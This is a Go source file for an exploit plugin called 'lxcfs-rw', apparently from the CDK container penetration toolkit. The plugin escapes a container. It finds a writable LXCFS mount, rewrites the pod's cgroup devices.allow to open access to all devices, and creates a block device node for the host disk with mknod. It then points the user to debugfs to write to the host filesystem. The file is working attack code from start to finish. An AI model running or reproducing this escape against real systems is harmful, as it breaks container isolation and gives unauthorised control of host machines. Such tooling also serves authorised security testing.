// +build !no_lxcfs_rw

package exploit

import (
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
	"syscall"

	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
)

const cgroupDevicePath string = "/sys/fs/cgroup/devices"
const devicesAllowName string = "devices.allow"
const devicesListName string = "devices.list"

// find rw lxcfs
func findTargetMountPoint(mi *util.MountInfo) bool {
	if mi.Device == "lxcfs" && util.IsDirectory(mi.MountPoint) {
		for _, opt := range mi.Opts {
			if opt == "rw" {
				log.Printf("found rw lxcfs mountpoint: %s\n", mi.MountPoint)
				return true
			}
		}
	}
	return false
}

// find pods cgroup devices path
func findDevicesAllowPath(mi *util.MountInfo) bool {
	if mi.MountPoint == cgroupDevicePath {
		log.Printf("found pod devices.allow path: %s\n", mi.Root)
		return true
	}
	return false
}

func getDevicesAllow(path string) string {
	f, err := os.Open(path)
	if err != nil {
		log.Printf("open devices.list failed. %v\n", err)
		return ""
	}
	defer f.Close()

	b, err := ioutil.ReadAll(f)
	if err != nil {
		log.Printf("read devices.list failed. %v\n", err)
		return ""
	}

	return string(b)
}

func ExploitLXCFS() bool {
	var targetMountPoint string
	var podCgroupPath string
	var devicesAllowPath, devicesListPath string
	var deviceMarjor, deviceMinor string

	mountInfos, err := util.GetMountInfo()
	if err != nil {
		log.Printf("%v", err)
		return false
	}

	for _, mi := range mountInfos {
		if findTargetMountPoint(&mi) {
			targetMountPoint = mi.MountPoint
		}
		if findDevicesAllowPath(&mi) {
			podCgroupPath = mi.Root
		}
		if util.FindTargetDeviceID(&mi) {
			deviceMarjor = mi.Marjor
			deviceMinor = mi.Minor
		}
	}

	devicesAllowPath = path.Join(targetMountPoint, "cgroup/devices", podCgroupPath, devicesAllowName)
	devicesListPath = path.Join(targetMountPoint, "cgroup/devices", podCgroupPath, devicesListName)

	err = util.SetBlockAccessible(devicesAllowPath)
	if err != nil {
		log.Printf("%v", err)
		return false
	}
	devicesAllow := getDevicesAllow(devicesListPath)
	log.Printf("devices.allow content: %s", devicesAllow)
	if strings.Contains(devicesAllow, "a *:* rwm") {
		dev := util.MakeDev(deviceMarjor, deviceMinor)
		if dev == 0 {
			log.Printf("Blockdevice Marjor/Minor number invalid.")
			return false
		}
		err = syscall.Mknod("./host_dev", syscall.S_IFBLK|uint32(os.FileMode(0700)), dev)
		if err != nil {
			log.Printf("mknod err: %v", err)
			return false
		}
		log.Printf("exploit success, run \"debugfs -w host_dev\".")
		return true
	}
	return false
}

type lxcfsRWS struct{}

func (l lxcfsRWS) Desc() string {
	return "escape container when root has LXCFS read & write privilege,  usage: `./cdk run lxcfs-rw`"
}

func (l lxcfsRWS) Run() bool {
	return ExploitLXCFS()
}

func init() {
	exploit := lxcfsRWS{}
	plugin.RegisterExploit("lxcfs-rw", exploit)
}
